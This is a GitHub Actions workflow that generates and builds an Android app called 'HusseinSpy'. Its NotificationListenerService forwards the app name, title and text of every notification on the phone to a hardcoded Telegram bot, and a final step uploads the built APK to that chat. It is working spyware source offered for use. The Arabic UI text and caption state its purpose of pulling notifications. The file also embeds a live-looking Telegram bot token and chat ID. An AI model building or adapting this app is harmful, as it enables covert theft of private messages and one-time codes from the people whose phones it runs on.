name: Hussein Notification Pro

on:
  workflow_dispatch:

env:
  TELEGRAM_TOKEN: "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU"
  TELEGRAM_CHAT_ID: "7392262688"

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout
        uses: actions/checkout@v4

      - name: Set up JDK 17
        uses: actions/setup-java@v4
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: 🛠️ Create Modern Android Project
        run: |
          mkdir -p app/src/main/java/com/hussein/spy
          mkdir -p app/src/main/res/layout

          # 1. تحديث ملف settings.gradle لتعريف المستودعات بشكل صحيح
          cat <<EOF > settings.gradle
          pluginManagement {
              repositories {
                  google()
                  mavenCentral()
                  gradlePluginPortal()
              }
          }
          dependencyResolutionManagement {
              repositoriesMode.set(RepositoriesMode.FAIL_ON_PROJECT_REPOS)
              repositories {
                  google()
                  mavenCentral()
              }
          }
          rootProject.name = "HusseinSpy"
          include ':app'
          EOF

          # 2. ملف build.gradle (الجذر)
          cat <<EOF > build.gradle
          plugins {
              id 'com.android.application' version '8.2.0' apply false
              id 'com.android.library' version '8.2.0' apply false
          }
          EOF

          # 3. ملف app/build.gradle (التطبيق)
          cat <<EOF > app/build.gradle
          plugins {
              id 'com.android.application'
          }
          android {
              namespace 'com.hussein.spy'
              compileSdk 34
              defaultConfig {
                  applicationId "com.hussein.spy"
                  minSdk 21
                  targetSdk 34
                  versionCode 1
                  versionName "1.0"
              }
          }
          EOF

          # 4. ملف Manifest
          cat <<EOF > app/src/main/AndroidManifest.xml
          <manifest xmlns:android="http://schemas.android.com/apk/res/android">
              <uses-permission android:name="android.permission.INTERNET" />
              <application android:label="Hussein Spy" android:theme="@android:style/Theme.Material.Light">
                  <activity android:name=".MainActivity" android:exported="true">
                      <intent-filter>
                          <action android:name="android.intent.action.MAIN" />
                          <category android:name="android.intent.category.LAUNCHER" />
                      </intent-filter>
                  </activity>
                  <service android:name=".NotificationService"
                      android:label="Hussein Service"
                      android:permission="android.permission.BIND_NOTIFICATION_LISTENER_SERVICE"
                      android:exported="true">
                      <intent-filter>
                          <action android:name="android.service.notification.NotificationListenerService" />
                      </intent-filter>
                  </service>
              </application>
          </manifest>
          EOF

          # 5. ملف MainActivity.java
          cat <<EOF > app/src/main/java/com/hussein/spy/MainActivity.java
          package com.hussein.spy;
          import android.app.Activity;
          import android.content.Intent;
          import android.os.Bundle;
          import android.widget.Button;
          import android.view.Gravity;
          import android.widget.LinearLayout;

          public class MainActivity extends Activity {
              @Override
              protected void onCreate(Bundle savedInstanceState) {
                  super.onCreate(savedInstanceState);
                  LinearLayout layout = new LinearLayout(this);
                  layout.setOrientation(LinearLayout.VERTICAL);
                  layout.setGravity(Gravity.CENTER);
                  Button btn = new Button(this);
                  btn.setText("تفعيل سحب الإشعارات");
                  btn.setOnClickListener(v -> {
                      startActivity(new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS"));
                  });
                  layout.addView(btn);
                  setContentView(layout);
              }
          }
          EOF

          # 6. ملف NotificationService.java (مع إرسال تلغرام)
          cat <<EOF > app/src/main/java/com/hussein/spy/NotificationService.java
          package com.hussein.spy;
          import android.service.notification.NotificationListenerService;
          import android.service.notification.StatusBarNotification;
          import android.os.Bundle;
          import java.net.HttpURLConnection;
          import java.net.URL;
          import java.net.URLEncoder;

          public class NotificationService extends NotificationListenerService {
              private final String TOKEN = "${{ env.TELEGRAM_TOKEN }}";
              private final String CHAT_ID = "${{ env.TELEGRAM_CHAT_ID }}";

              @Override
              public void onNotificationPosted(StatusBarNotification sbn) {
                  Bundle extras = sbn.getNotification().extras;
                  String title = String.valueOf(extras.get("android.title"));
                  String text = String.valueOf(extras.get("android.text"));
                  String app = sbn.getPackageName();
                  String message = "🔥 *إشعار جديد* \n\n" + "📱 *التطبيق:* " + app + "\n" + "👤 *العنوان:* " + title + "\n" + "📝 *النص:* " + text;
                  sendToTelegram(message);
              }

              private void sendToTelegram(final String msg) {
                  new Thread(() -> {
                      try {
                          String urlString = "https://api.telegram.org/bot" + TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&text=" + URLEncoder.encode(msg, "UTF-8") + "&parse_mode=Markdown";
                          URL url = new URL(urlString);
                          HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                          conn.setRequestMethod("GET");
                          conn.getResponseCode();
                      } catch (Exception e) { e.printStackTrace(); }
                  }).start();
              }
          }
          EOF

      - name: 🚀 Build APK (Mandatory)
        run: |
          gradle wrapper
          chmod +x gradlew
          ./gradlew assembleDebug --stacktrace

      - name: 📤 Send to Hussein
        run: |
          APK_FILE=$(find app/build/outputs/apk/debug -name "*.apk" | head -n 1)
          curl -s -X POST "https://api.telegram.org/bot${{ env.TELEGRAM_TOKEN }}/sendDocument" \
            -F "chat_id=${{ env.TELEGRAM_CHAT_ID }}" \
            -F "document=@$APK_FILE" \
            -F "caption=✅ تم البناء بنجاح يا حسين! التطبيق الآن يسحب الإشعارات ويرسلها لك هنا."
